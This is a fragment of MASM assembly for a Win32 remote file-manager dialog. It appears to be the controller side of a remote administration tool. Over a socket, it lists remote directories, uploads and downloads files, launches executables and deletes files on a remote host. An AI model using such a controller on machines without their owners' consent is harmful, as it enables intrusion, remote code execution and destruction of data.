
DeleteTreeViewNode proc uses ebx esi edi lpesi
LOCAL	@lsls:dword
	mov esi,lpesi
	assume esi:ptr OVERLAPPEDPLUS
	.if [esi].hlstvitem
		mov eax,[esi].hlstvitem
		mov @lsls,eax
        invoke SendMessage,[esi].htreeview,TVM_GETNEXTITEM,TVGN_NEXT,[esi].hlstvitem
		mov [esi].hlstvitem,eax
		invoke SendMessage,[esi].htreeview,TVM_DELETEITEM,0,@lsls
		invoke DeleteTreeViewNode,esi
	.endif    
	assume esi:nothing
	ret
DeleteTreeViewNode endp

GetTreeViewFNode proc uses ebx esi edi lpesi,lpbuf,lpzbuf
	LOCAL tvins:TVITEM
	mov esi,lpesi
	assume esi:ptr OVERLAPPEDPLUS
	invoke SendMessage,[esi].htreeview,TVM_GETNEXTITEM,TVGN_PARENT,[esi].hlstvitem
	.if eax
		mov [esi].hlstvitem,eax
		mov tvins.hItem,eax
		invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,MAX_PATH
		mov ebx,eax
		mov tvins.cchTextMax,MAX_PATH
		mov tvins.pszText,ebx
		mov tvins._mask,TVIF_TEXT or TVIF_PARAM
		invoke SendMessage,[esi].htreeview,TVM_GETITEM,0,addr tvins
		invoke lstrcat,ebx,lpbuf
		invoke GlobalFree,lpbuf
		invoke GetTreeViewFNode,esi,ebx,lpzbuf
	.else
		invoke lstrcat,lpzbuf,lpbuf
	.endif
	assume esi:nothing
	ret
GetTreeViewFNode endp

EnableFileTUREFALSE	proc uses ebx esi edi lpesi,lpbool
	mov esi,lpesi
	assume esi:ptr OVERLAPPEDPLUS
	invoke EnableWindow,[esi].htreeview,lpbool
	invoke EnableWindow,[esi].hyunxing,lpbool
	invoke EnableWindow,[esi].hshangchuan,lpbool
	invoke EnableWindow,[esi].hxiazai,lpbool
	invoke EnableWindow,[esi].hdelfile,lpbool
	assume esi:nothing
	ret
EnableFileTUREFALSE endp

AddTreeViewNode proc	uses ebx edi esi hWin, lhPar, pszText, lParam
	LOCAL   tvins:TV_INSERTSTRUCT
	invoke LYQZeroMemory,addr tvins,sizeof TV_INSERTSTRUCT
	m2m		tvins.hParent     , lhPar			; Handle to the parent item
	m2m		tvins.hInsertAfter, TVI_LAST	; TVI_FIRST, VI_LAST, TVI_SORT
	m2m		tvins.item.lParam , lParam			; The node handle (hTVItem)
	mov		tvins.item._mask  , TVIF_TEXT or TVIF_PARAM
	mov 	tvins.item.cchTextMax,MAX_PATH
	m2m		tvins.item.pszText, pszText		; The item text string
	invoke SendMessage, hWin, TVM_INSERTITEM, 0, addr tvins
	ret
AddTreeViewNode endp

ProcTreeView	proc uses ebx edi esi hWnd,wMsg,wParam,lParam
	LOCAL tvhit:TV_HITTESTINFO
	LOCAL tvins:TVITEM
	LOCAL @pstr[MAX_PATH]:byte
    mov eax,wMsg
	.if eax==WM_LBUTTONDBLCLK
		mov	eax, lParam
		and	eax, 0FFFFh		; 1111,1111,1111,1111b
		mov	tvhit.pt.x, eax
		mov	eax, lParam
		shr	eax, 16			; Shift (divide) right 16 positions. Add 16 leading "0"s
		mov	tvhit.pt.y, eax
		mov	tvhit.flags,TVHT_ONITEM	
		invoke SendMessage, hWnd, TVM_HITTEST, 0, addr tvhit
		mov ebx,eax
		mov tvins.hItem,eax
		mov tvins.cchTextMax,MAX_PATH
		lea eax,@pstr
		mov tvins.pszText,eax
		mov tvins._mask,TVIF_TEXT or TVIF_PARAM
		invoke SendMessage,hWnd,TVM_GETITEM,0,addr tvins
		mov esi,tvins.lParam
		assume esi:ptr OVERLAPPEDPLUS
		mov [esi].htvitem,ebx
		mov [esi].hlstvitem,ebx
		invoke LYQZeroMemory,[esi].lpfiledir,MAX_PATH
		invoke LYQZeroMemory,[esi].lpfilename,MAX_PATH
		invoke LYQMoveMemory,[esi].lpfilename,addr @pstr,MAX_PATH
		invoke SendMessage,[esi].htreeview,TVM_GETNEXTITEM,TVGN_CHILD,[esi].hlstvitem
		mov [esi].hlstvitem,eax
		invoke DeleteTreeViewNode,esi
		mov [esi].htvitem,ebx
		mov [esi].hlstvitem,ebx
		invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,MAX_PATH
		invoke GetTreeViewFNode,esi,eax,[esi].lpfiledir
		invoke lstrcat,[esi].lpfiledir,addr @pstr
		invoke SendMessage,[esi].hwinstatus,SB_SETTEXT,0 ,[esi].lpfiledir
		invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,MAX_PATH
		mov ebx,eax
		mov edi,eax
		invoke LYQMoveMemory,ebx,[esi].lpfiledir,MAX_PATH
		invoke lstrlen,ebx
		add ebx,eax
		dec ebx
		invoke lstrcmp,ebx,CTEXT("\")
		.if eax==0
			invoke EnableWindow,hWnd,FALSE
			invoke WSASends,[esi].hsocket,edi,MAX_PATH,SOCKETTAG.getfilestr
	    .endif
		assume esi:nothing
    .else
		invoke CallWindowProc,lpProctreeview,hWnd,wMsg,wParam,lParam
		ret	
	.endif	
	xor eax,eax
	ret	
ProcTreeView endp

ProcDlgFile	proc uses ebx edi esi hWnd,wMsg,wParam,lParam
LOCAL	@stopenfile:OPENFILENAME
LOCAL	@rect:RECT
LOCAL	@lsfile[MAX_PATH]:byte
    mov eax,wMsg
	.if eax==WM_CLOSE
		invoke GetWindowLong,hWnd,GWL_USERDATA
		mov esi,eax
		assume esi:ptr OVERLAPPEDPLUS
		mov [esi].otherfree,1
		invoke PostQueuedCompletionStatus,hiocp,0,0,esi
		assume esi:nothing
		invoke EndDialog,hWnd,NULL
	.elseif	eax==WM_INITDIALOG
		invoke LoadIcon,hInstance,ICO_MAIN
		invoke SendMessage,hWnd,WM_SETICON,ICON_BIG,eax
	.elseif eax==WM_SIZE		
	    invoke GetClientRect,hWnd,addr @rect
		invoke GetDlgItem,hWnd,3001
		mov ebx,eax
		mov edi,@rect.bottom
		sub edi,45
		invoke SetWindowPos,ebx,HWND_NOTOPMOST,0,0,@rect.right,edi,SWP_NOZORDER
		invoke GetDlgItem,hWnd,3009
		invoke SetWindowPos,eax,HWND_NOTOPMOST,0,edi,0,0,SWP_NOSIZE or SWP_NOZORDER
		invoke GetDlgItem,hWnd,3006
		invoke SetWindowPos,eax,HWND_NOTOPMOST,63,edi,0,0,SWP_NOSIZE or SWP_NOZORDER
		invoke GetDlgItem,hWnd,3007
		invoke SetWindowPos,eax,HWND_NOTOPMOST,135,edi,0,0,SWP_NOSIZE or SWP_NOZORDER
		invoke GetDlgItem,hWnd,3005
		invoke SetWindowPos,eax,HWND_NOTOPMOST,192,edi,0,0,SWP_NOSIZE or SWP_NOZORDER
		invoke GetDlgItem,hWnd,3010
		invoke SetWindowPos,eax,HWND_NOTOPMOST,261,edi,0,0,SWP_NOSIZE or SWP_NOZORDER
		invoke GetDlgItem,hWnd,3008
		invoke SetWindowPos,eax,HWND_NOTOPMOST,300,edi,0,0,SWP_NOSIZE or SWP_NOZORDER
		invoke GetDlgItem,hWnd,3002
		invoke SetWindowPos,eax,HWND_NOTOPMOST,339,edi,0,0,SWP_NOSIZE or SWP_NOZORDER
		invoke GetDlgItem,hWnd,3003
		invoke SetWindowPos,eax,HWND_NOTOPMOST,378,edi,0,0,SWP_NOSIZE or SWP_NOZORDER
		mov edi,@rect.bottom
		sub edi,20
		invoke GetDlgItem,hWnd,3004
		invoke SetWindowPos,eax,HWND_NOTOPMOST,0,edi,@rect.right,20,SWP_NOZORDER
	.elseif eax==WM_SHOWWINDOW
		invoke GetWindowLong,hWnd,GWL_USERDATA
		mov esi,eax
		assume esi:ptr OVERLAPPEDPLUS
		invoke SetWindowText,hWnd,[esi].lpipport
		invoke SetWindowLong,[esi].htreeview,GWL_WNDPROC,addr ProcTreeView
		mov lpProctreeview,eax
		assume esi:nothing
	.elseif eax==WM_COMMAND
		mov eax,wParam
		.if ax==3002
			shr eax,16
			.if ax==BN_CLICKED
				invoke GetWindowLong,hWnd,GWL_USERDATA
				mov esi,eax
				assume esi:ptr OVERLAPPEDPLUS
				invoke LYQZeroMemory,addr @stopenfile,sizeof @stopenfile
				mov @stopenfile.lStructSize,sizeof @stopenfile
				push [esi].hform
				pop @stopenfile.hwndOwner
				mov eax,offset szfilter
				mov @stopenfile.lpstrFilter,eax
				invoke LYQZeroMemory,[esi].lpfilename,MAX_PATH
;							invoke lstrcat,[esi].lpfilename,CTEXT("heishibai")
				mov eax,[esi].lpfilename
				mov @stopenfile.lpstrFile,eax
				mov @stopenfile.nMaxFile,MAX_PATH
				lea eax,@lsfile
				mov @stopenfile.lpstrFileTitle,eax
				mov @stopenfile.nMaxFileTitle,MAX_PATH
				mov @stopenfile.Flags,OFN_FILEMUSTEXIST or OFN_PATHMUSTEXIST
				invoke GetOpenFileName,addr @stopenfile
				.if eax
					invoke CreateFile,[esi].lpfilename,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL
					.if eax!=INVALID_HANDLE_VALUE
						mov [esi].hfile,eax
						invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,MAX_PATH
						mov ebx,eax
						invoke LYQMoveMemory,ebx,[esi].lpfiledir,MAX_PATH
						invoke lstrcat,ebx,addr @lsfile
						invoke WSASends,[esi].hsocket,ebx,MAX_PATH,SOCKETTAG.scfileinfo
					    invoke EnableFileTUREFALSE,esi,FALSE
					.endif
				.endif
				assume esi:nothing
			.endif
		.elseif ax==3003
			shr eax,16
			.if ax==BN_CLICKED
				invoke GetWindowLong,hWnd,GWL_USERDATA
				mov esi,eax
				assume esi:ptr OVERLAPPEDPLUS
				invoke LYQZeroMemory,addr @stopenfile,sizeof @stopenfile
				mov @stopenfile.lStructSize,sizeof @stopenfile
				push [esi].hform
				pop @stopenfile.hwndOwner
				mov eax,offset szfilter
				mov @stopenfile.lpstrFilter,eax
				mov eax,[esi].lpfilename
				mov @stopenfile.lpstrFile,eax
				mov @stopenfile.nMaxFile,MAX_PATH
				mov @stopenfile.nMaxFileTitle,MAX_PATH
				mov @stopenfile.Flags,OFN_OVERWRITEPROMPT
				invoke GetSaveFileName,addr @stopenfile
				.if eax
					invoke CreateFile,[esi].lpfilename,GENERIC_WRITE,FILE_SHARE_READ,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL
					mov [esi].hfile,eax
					invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,MAX_PATH
					mov ebx,eax
					invoke LYQMoveMemory,ebx,[esi].lpfiledir,MAX_PATH
					invoke WSASends,[esi].hsocket,ebx,MAX_PATH,SOCKETTAG.fileinfo
					invoke EnableFileTUREFALSE,esi,FALSE
				.endif
				assume esi:nothing
			.endif
		.elseif ax==3008
			shr eax,16
			.if ax==BN_CLICKED
				invoke GetWindowLong,hWnd,GWL_USERDATA
				mov esi,eax
				assume esi:ptr OVERLAPPEDPLUS
				invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,MAX_PATH
				mov ebx,eax
				invoke LYQMoveMemory,ebx,[esi].lpfiledir,MAX_PATH
				invoke WSASends,[esi].hsocket,ebx,MAX_PATH,SOCKETTAG.runexe
				assume esi:nothing
			.endif
		.elseif ax==3010
			shr eax,16
			.if ax==BN_CLICKED
				invoke GetWindowLong,hWnd,GWL_USERDATA
				mov esi,eax
				assume esi:ptr OVERLAPPEDPLUS
				invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,MAX_PATH
				mov ebx,eax
				invoke LYQMoveMemory,ebx,[esi].lpfiledir,MAX_PATH
				invoke WSASends,[esi].hsocket,ebx,MAX_PATH,SOCKETTAG.delfile
				assume esi:nothing
			.endif
		.endif	
        .else
			mov eax,FALSE
			ret	
		.endif	
		mov eax,TRUE
		ret	
ProcDlgFile	endp
